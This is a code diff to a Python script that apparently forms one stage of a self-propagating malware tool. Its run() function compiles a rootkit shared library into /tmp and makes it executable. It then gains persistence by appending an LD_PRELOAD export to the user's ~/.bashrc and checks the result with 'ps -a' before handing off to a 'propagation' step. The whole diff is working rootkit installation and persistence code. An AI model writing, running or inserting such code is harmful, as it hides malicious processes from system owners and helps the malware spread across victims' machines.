@@ -5,7 +5,7 @@
 from pathlib import Path
 import subprocess
 from pathlib import Path
-
+import time
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
@@ -34,9 +34,12 @@ def run():
     # subprocess.run(f"echo 'export LD_PRELOAD={dir_path}/../utils/rootkit.so'>> ~/.bashrc && source ~/.bashrc")
     # subprocess.run("export LD_PRELOAD=./utils/rootkit.so ps", shell=True)
     subprocess.run("gcc -fPIC -shared -o /tmp/rootkit.so ./utils/rootkit.c -ldl" , shell=True)
-    subprocess.run(f"echo 'export LD_PRELOAD=/tmp/rootkit.so' >> ~/.bashrc && source ~/.bashrc" , shell=True)
-
+    subprocess.run("chmod 755 /tmp/rootkit.so" , shell=True)
+    subprocess.run("echo 'export LD_PRELOAD=/tmp/rootkit.so' >> ~/.bashrc && . ~/.bashrc" , shell=True)
+    
+    time.sleep(1)
     subprocess.run("ps -a" , shell=True)
+
     next_action = "propagation"
     return data, next_action
 
